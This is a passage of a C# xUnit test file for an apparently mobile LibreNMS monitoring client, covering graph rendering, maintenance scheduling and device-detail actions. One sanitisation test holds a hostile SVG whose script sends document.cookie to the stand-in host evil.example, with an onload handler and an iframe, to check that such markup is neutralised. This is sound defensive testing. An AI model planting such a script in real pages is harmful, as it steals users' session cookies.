        Assert.Equal("Gi0/5", visit.Parameters[Routes.PortParameter]);
        Assert.Equal("edge-rtr", visit.Parameters[Routes.DeviceNameParameter]);
    }
}

public sealed class GraphTests
{
    private const string RrdSvg = "<?xml version=\"1.0\"?><svg width=\"800pt\" height=\"400pt\" xmlns=\"http://www.w3.org/2000/svg\"><text fill=\"rgb(0%, 0%, 0%)\">In</text></svg>";

    [Fact]
    public void Graphs_get_a_viewbox_so_they_scale_to_the_screen()
    {
        var scalable = GraphHtml.MakeScalable(RrdSvg);

        Assert.Contains("viewBox=\"0 0 800 400\"", scalable);
        Assert.Equal(scalable, GraphHtml.MakeScalable(scalable)); // only once
    }

    [Fact]
    public void Small_graphs_are_restyled_into_the_apps_colours_in_either_theme()
    {
        // Core's GraphSvgStyle recolours rrdtool's black text, as desktop's graphs (#158).
        var light = GraphHtml.Build(RrdSvg, dark: false);
        var dark = GraphHtml.Build(RrdSvg, dark: true);

        Assert.DoesNotContain("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(light));
        Assert.DoesNotContain("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(dark));
        Assert.Contains("#FFFFFF", light);
        Assert.Contains("#11141A", dark);

        // The Graphs page restyles first, choosing its series: Page only wraps.
        Assert.Contains("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(GraphHtml.Page(RrdSvg, dark: true)));
    }

    [Fact]
    public void The_graph_fits_its_own_shape() =>
        Assert.Equal(0.5, GraphHtml.AspectOf(RrdSvg));

    [Fact]
    public void A_hostile_graph_is_shown_as_an_image_never_as_markup()
    {
        const string hostile = "<svg width=\"10\" height=\"10\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"steal()\">"
            + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>"
            + "<foreignObject><iframe src=\"https://evil.example/\"></iframe></foreignObject>"
            + "<a href=\"https://evil.example/\"><text>click</text></a></svg>";

        var page = GraphHtml.Build(hostile, dark: false);

        // Nothing from the SVG reaches the page as markup...
        Assert.DoesNotContain("<script", page, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onload", page, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example", page, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<iframe", page, StringComparison.OrdinalIgnoreCase);

        // ...it's only an image, under a policy that allows no script or network.
        Assert.Contains("src=\"data:image/svg+xml;base64,", page);
        Assert.Contains($"content=\"{GraphHtml.ContentSecurityPolicy}\"", page);
        Assert.Contains("default-src 'none'", GraphHtml.ContentSecurityPolicy);
        Assert.DoesNotContain("script-src", GraphHtml.ContentSecurityPolicy);
        Assert.Contains("<script>", GraphHtml.ImageOf(page)); // still in the image, where it can't run
    }

    [Fact]
    public void An_svg_without_a_namespace_gets_one_so_it_draws_as_an_image()
    {
        Assert.Contains("xmlns=\"http://www.w3.org/2000/svg\"", GraphHtml.WithNamespace("<svg width=\"1\"><g/></svg>"));
        Assert.Equal(RrdSvg, GraphHtml.WithNamespace(RrdSvg));
    }

    [Fact]
    public async Task Graphs_merge_desktops_three_lists_and_draw_the_first()
    {
        var client = Fakes.Client();
        client.Graphs.ListAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_uptime", Description = "Uptime" }]);
        client.Graphs.ListHealthAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_temperature", Description = "Temperature" }]);
        client.Graphs.ListWirelessAsync(7, Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<GraphType>>(_ => throw new LibreNmsApiException("no wireless", System.Net.HttpStatusCode.NotFound));
        client.Graphs.GetSvgAsync(7, Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);

        await vm.LoadAsync(7, "edge-rtr");

        Assert.Equal(["Temperature", "Uptime"], vm.Graphs.Select(g => g.Description));
        Assert.Equal("device_temperature", vm.SelectedGraph!.Name);
        Assert.Contains("viewBox", GraphHtml.ImageOf(vm.GraphPage!));
        await client.Graphs.Received(1).GetSvgAsync(7, "device_temperature", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Graphs_open_on_the_graph_tapped_over_its_range_not_the_first()
    {
        var client = Fakes.Client();
        client.Graphs.ListAsync(7, Arg.Any<CancellationToken>()).Returns(
        [
            new GraphType { Name = "device_uptime", Description = "Uptime" },
            new GraphType { Name = "device_icmp_perf", Description = "Ping response" },
        ]);
        client.Graphs.ListHealthAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_temperature", Description = "Temperature" }]);
        client.Graphs.ListWirelessAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<GraphType>());
        client.Graphs.GetSvgAsync(7, Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);

        await vm.LoadAsync(7, "edge-rtr", "device_icmp_perf", GraphTimeRangePreset.Week);

        Assert.Equal("device_icmp_perf", vm.SelectedGraph!.Name); // not Ping response's alphabetical neighbour (#119)
        Assert.Equal(GraphTimeRangePreset.Week, vm.SelectedRange.Range.Preset);
        await client.Graphs.Received().GetSvgAsync(7, "device_icmp_perf", GraphTimeRange.LastWeek, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());

        // One the device no longer has: its first, as before.
        var again = new DeviceGraphsViewModel(client);
        await again.LoadAsync(7, "edge-rtr", "gone_graph");
        Assert.Equal("device_icmp_perf", again.SelectedGraph!.Name); // "Ping response" sorts first
    }

    [Fact]
    public async Task Changing_the_range_redraws_and_going_back_uses_the_cache()
    {
        var client = Fakes.Client();
        client.Graphs.ListAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_uptime", Description = "Uptime" }]);
        client.Graphs.ListHealthAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<GraphType>());
        client.Graphs.ListWirelessAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<GraphType>());
        client.Graphs.GetSvgAsync(7, Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);
        await vm.LoadAsync(7);

        vm.SelectRangeCommand.Execute(vm.Ranges[2]); // week
        await vm.LoadGraphAsync();
        vm.SelectRangeCommand.Execute(vm.Ranges[1]); // back to day
        await vm.LoadGraphAsync();

        await client.Graphs.Received(1).GetSvgAsync(7, "device_uptime", GraphTimeRange.LastWeek, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
        await client.Graphs.Received(1).GetSvgAsync(7, "device_uptime", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task A_port_shows_desktops_port_graphs_starting_with_traffic()
    {
        var client = Fakes.Client();
        client.Graphs.GetPortSvgAsync(7, Arg.Any<string>(), Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);

        await vm.LoadPortAsync(7, "Gi0/5", "GigabitEthernet0/5", "edge-rtr");

        Assert.Equal("GigabitEthernet0/5 · edge-rtr", vm.Title);
        Assert.Equal(["port_bits", "port_upkts", "port_nupkts", "port_errors"], vm.Graphs.Select(g => g.Name));
        Assert.Equal("port_bits", vm.SelectedGraph!.Name);
        Assert.NotNull(vm.GraphPage);
        await client.Graphs.Received(1).GetPortSvgAsync(7, "Gi0/5", "port_bits", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
        await client.Graphs.DidNotReceiveWithAnyArgs().GetSvgAsync(default, default!, default, default, default, default);
        await client.Graphs.DidNotReceiveWithAnyArgs().ListAsync(default, default);

        vm.SelectedGraph = vm.Graphs[3];
        await vm.LoadGraphAsync();
        await client.Graphs.Received(1).GetPortSvgAsync(7, "Gi0/5", "port_errors", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
    }
}

public sealed class MaintenanceViewModelTests
{
    private readonly ILibreNmsClient _client = Fakes.Client();
    private readonly IDialogService _dialogs = Substitute.For<IDialogService>();
    private readonly RecordingNavigation _navigation = new();
    private readonly FakeTimeProvider _time = new(new DateTimeOffset(2026, 9, 28, 9, 7, 0, TimeSpan.Zero));

    private MaintenanceViewModel NewViewModel()
    {
        _time.SetLocalTimeZone(TimeZoneInfo.Utc);
        var vm = new MaintenanceViewModel(_client, _dialogs, _navigation, _time);
        vm.Initialize(7, "edge-rtr");
        return vm;
    }

    [Fact]
    public async Task Starts_now_for_an_hour_skipping_alerts_by_default_as_desktop()
    {
        DeviceMaintenanceRequest? sent = null;
        _client.Devices.ScheduleMaintenanceAsync(7, Arg.Do<DeviceMaintenanceRequest>(r => sent = r), Arg.Any<CancellationToken>())
            .Returns("Device edge-rtr will begin maintenance mode now for 1h");
        var vm = NewViewModel();

        await vm.SaveCommand.ExecuteAsync(null);

        Assert.Null(sent!.Start);
        Assert.Equal("1:00", sent.Duration);
        Assert.Equal((int)MaintenanceBehavior.SkipAlerts, sent.Behavior);
        await _dialogs.Received(1).AlertAsync("Maintenance scheduled", "Device edge-rtr will begin maintenance mode now for 1h");
        Assert.Equal(Routes.Back, _navigation.Visits.Single().Route);
    }

    [Fact]
    public async Task Later_start_is_sent_as_picked_in_server_time()
    {
        DeviceMaintenanceRequest? sent = null;
        _client.Devices.ScheduleMaintenanceAsync(7, Arg.Do<DeviceMaintenanceRequest>(r => sent = r), Arg.Any<CancellationToken>()).Returns("ok");
        var vm = NewViewModel();

        Assert.Equal(new TimeSpan(9, 15, 0), vm.StartTime); // next quarter hour
        vm.StartNow = false;
        vm.StartDate = new DateTime(2026, 9, 29);
        vm.StartTime = new TimeSpan(22, 30, 0);
        vm.ApplyPresetCommand.Execute(vm.Presets.Single(p => p.Label == "30m"));
        vm.SelectedBehavior = vm.Behaviors[1];
        vm.MaintenanceTitle = "  Firmware  ";

        await vm.SaveCommand.ExecuteAsync(null);

        Assert.Equal("2026-09-29 22:30:00", sent!.Start);
        Assert.Equal("0:30", sent.Duration);
        Assert.Equal((int)MaintenanceBehavior.MuteAlerts, sent.Behavior);
        Assert.Equal("Firmware", sent.Title);
    }

    [Fact]
    public async Task A_zero_duration_or_a_past_start_is_refused()
    {
        var vm = NewViewModel();
        vm.DurationHours = 0;
        vm.DurationMinutes = 0;
        await vm.SaveCommand.ExecuteAsync(null);
        Assert.True(vm.HasError);

        vm.DurationHours = 1;
        vm.StartNow = false;
        vm.StartDate = new DateTime(2026, 9, 27);
        await vm.SaveCommand.ExecuteAsync(null);
        Assert.Contains("already passed", vm.ErrorMessage);

        await _client.Devices.DidNotReceiveWithAnyArgs().ScheduleMaintenanceAsync(default, default!, default);
    }
}

public sealed class DeviceDetailActionTests
{
    private readonly ILibreNmsClient _client = Fakes.Client();
    private readonly IDialogService _dialogs = Substitute.For<IDialogService>();
    private readonly RecordingNavigation _navigation = new();
    private readonly DeviceDetailViewModel _vm;

    public DeviceDetailActionTests()
    {
        _client.Devices.GetAsync("7", Arg.Any<CancellationToken>()).Returns(Fakes.Device(7, "edge-rtr"));
        var settings = Fakes.Settings();
        _vm = new DeviceDetailViewModel(_client, settings, Substitute.For<ILauncherService>(), new DeviceBookmarks(settings, TimeProvider.System), _dialogs, _navigation);
    }

    [Fact]
    public async Task The_foot_of_the_page_says_when_it_was_last_polled()
    {
        var device = Fakes.Device(8, "core-sw");
        device.LastDiscovered = DateTime.Now.AddHours(-3);
        device.LastPolled = new DateTime(2026, 10, 1, 9, 41, 7);
        device.LastPolledTimeTaken = 4.2;
        _client.Devices.GetAsync("8", Arg.Any<CancellationToken>()).Returns(device);

        await _vm.LoadAsync(8);

        Assert.StartsWith("Last polled ", _vm.FreshnessText);
        var polled = Assert.Single(_vm.Properties, p => p.Key == "Last polled");
        Assert.EndsWith(", took 4.2s", polled.Value);
        Assert.Contains(_vm.Properties, p => p.Key == "Last discovered"); // still listed (#97)
    }

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public async Task Last_polled_sent_with_its_own_zone_reads_right_whatever_the_UTC_setting(bool serverTimestampsAreUtc)
    {
        // LibreNMS sends last_polled as a zoned ISO string (a Laravel datetime
        // cast), unlike its other times; read as unzoned it came out an hour
        // ahead in BST, so every device said "just now" (DashyNMS/desktop#210).
        var polled = DateTime.UtcNow.AddMinutes(-9).ToString("yyyy-MM-ddTHH:mm:ss.ffffff'Z'", System.Globalization.CultureInfo.InvariantCulture);
        var device = System.Text.Json.JsonSerializer.Deserialize<Device>(
            $$"""{ "device_id": 11, "hostname": "core-sw", "last_polled": "{{polled}}" }""",
            DesktopNMS.Core.Json.LibreNmsJson.Options)!;
        _client.Devices.GetAsync("11", Arg.Any<CancellationToken>()).Returns(device);
        var settings = Fakes.Settings(new AppSettings { ServerTimestampsAreUtc = serverTimestampsAreUtc });
        var vm = new DeviceDetailViewModel(_client, settings, Substitute.For<ILauncherService>(), new DeviceBookmarks(settings, TimeProvider.System), _dialogs, _navigation);

        await vm.LoadAsync(11);

        Assert.Equal("Last polled 9m ago", vm.FreshnessText);
    }

    [Theory]
    [InlineData(4.234, "took 4.2s")]
    [InlineData(61.8, "took 62s")]
    [InlineData(-1d, null)]
    [InlineData(null, null)]
    public void A_polls_length_reads_plainly(double? seconds, string? expected) =>
        Assert.Equal(expected, DeviceDetailViewModel.TookText(seconds));

    [Fact]
    public async Task Without_a_poll_time_the_foot_falls_back_to_last_discovered()
    {
        var device = Fakes.Device(9, "old-server");
        device.LastDiscovered = DateTime.Now.AddHours(-3);
        _client.Devices.GetAsync("9", Arg.Any<CancellationToken>()).Returns(device);

        await _vm.LoadAsync(9);

        Assert.StartsWith("Last discovered ", _vm.FreshnessText);
        Assert.DoesNotContain(_vm.Properties, p => p.Key == "Last polled");
    }

    [Fact]
    public async Task Rediscover_asks_first_then_shows_librenms_reply()
    {
        await _vm.LoadAsync(7);
        _dialogs.ConfirmAsync(default!, default!, default!, default!).ReturnsForAnyArgs(true);
        _client.Devices.DiscoverAsync(7, Arg.Any<CancellationToken>()).Returns("Device will be rediscovered");

        await _vm.RediscoverCommand.ExecuteAsync(null);

        await _dialogs.Received(1).AlertAsync("Rediscover requested", "Device will be rediscovered");
    }

    [Fact]
    public async Task Rediscover_goes_ahead_without_asking()
    {
        await _vm.LoadAsync(7);

        await _vm.RediscoverCommand.ExecuteAsync(null);

        // One device, and harmless: it just happens (#146).
        await _dialogs.DidNotReceiveWithAnyArgs().ConfirmAsync(default!, default!, default!, default!);
        await _client.Devices.Received(1).DiscoverAsync(7, Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Sections_open_their_page_with_the_device()
    {
        await _vm.LoadAsync(7);

        await _vm.OpenSectionCommand.ExecuteAsync(DeviceSectionInfo.For(DeviceSection.Ports));
        await _vm.OpenSectionCommand.ExecuteAsync(DeviceSectionInfo.For(DeviceSection.Graphs));
        await _vm.ScheduleMaintenanceCommand.ExecuteAsync(null);

        // The Event log is the Logs page with its Device chip fixed (#125).
        await _vm.OpenSectionCommand.ExecuteAsync(DeviceSectionInfo.For(DeviceSection.EventLog));

        Assert.Equal([Routes.DeviceSection, Routes.DeviceGraphs, Routes.Maintenance, Routes.Logs], _navigation.Visits.Select(v => v.Route));
        Assert.Equal(7, _navigation.Visits[3].Parameters![Routes.DeviceIdParameter]);
        Assert.Equal(DeviceSection.Ports, _navigation.Visits[0].Parameters![Routes.SectionParameter]);
        Assert.Equal("edge-rtr", _navigation.Visits[2].Parameters![Routes.DeviceNameParameter]);
    }
}
